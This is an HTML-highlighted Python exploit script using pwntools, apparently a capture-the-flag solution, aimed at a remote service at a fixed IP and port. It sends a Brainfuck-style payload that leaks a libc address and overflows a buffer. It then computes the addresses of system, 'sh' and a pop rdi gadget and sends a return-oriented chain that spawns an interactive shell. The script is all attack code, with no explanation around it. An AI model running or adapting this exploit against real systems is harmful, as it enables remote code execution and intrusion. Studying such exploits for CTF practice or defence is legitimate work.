<div class="highlight"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>


<span class="c">#remote</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">&#39;120.55.86.95&#39;</span><span class="p">,</span> <span class="mi">22222</span><span class="p">)</span>
<span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;=&#39;</span><span class="p">)</span>


<span class="n">payload0</span>  <span class="o">=</span> <span class="s">&#39;,[&gt;,]&#39;</span>
<span class="n">payload0</span> <span class="o">+=</span> <span class="s">&#39;&gt;&#39;</span><span class="o">*</span><span class="mi">16</span>
<span class="n">payload0</span> <span class="o">+=</span> <span class="s">&#39;.&gt;&#39;</span><span class="o">*</span><span class="mi">8</span>	<span class="c">#leak</span>
<span class="n">payload0</span> <span class="o">+=</span> <span class="s">&#39;&lt;&#39;</span><span class="o">*</span><span class="mi">9</span>	<span class="c">#back</span>
<span class="n">payload0</span> <span class="o">+=</span> <span class="s">&#39;,&gt;&#39;</span><span class="o">*</span><span class="mi">25</span>	<span class="c">#input</span>
<span class="n">payload0</span> <span class="o">+=</span> <span class="s">&#39;]q&#39;</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload0</span><span class="p">)</span>


<span class="n">payload1</span> <span class="o">=</span> <span class="s">&#39;</span><span class="se">\xee</span><span class="s">&#39;</span><span class="o">*</span><span class="mh">0x207</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;OK</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>

<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
<span class="nb">raw_input</span><span class="p">(</span><span class="s">&quot;print recv?&quot;</span><span class="p">)</span>
<span class="n">rdata</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="k">print</span> <span class="n">rdata</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)</span>
<span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">rdata</span><span class="p">[:</span><span class="mi">8</span><span class="p">]))</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">-</span> <span class="mh">0x21EC5</span> <span class="o">+</span> <span class="mh">0x0000000000046640</span>
<span class="k">print</span> <span class="s">&#39;system </span><span class="si">%x</span><span class="s">&#39;</span><span class="o">%</span><span class="n">system</span>
<span class="n">sh</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">-</span> <span class="mh">0x21EC5</span> <span class="o">+</span> <span class="mi">1559771</span>
<span class="k">print</span> <span class="s">&#39;sh </span><span class="si">%x</span><span class="s">&#39;</span><span class="o">%</span><span class="n">sh</span>

<span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">-</span> <span class="mh">0x21EC5</span> <span class="o">+</span> <span class="mh">0x0000000000022b1a</span>
<span class="k">print</span> <span class="s">&#39;pop_rdi</span><span class="si">%x</span><span class="s">&#39;</span><span class="o">%</span><span class="n">pop_rdi</span>

<span class="n">payload2</span>  <span class="o">=</span> <span class="s">&#39;&#39;</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
<span class="nb">raw_input</span><span class="p">(</span><span class="s">&quot;send payload2?&quot;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>

	
<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>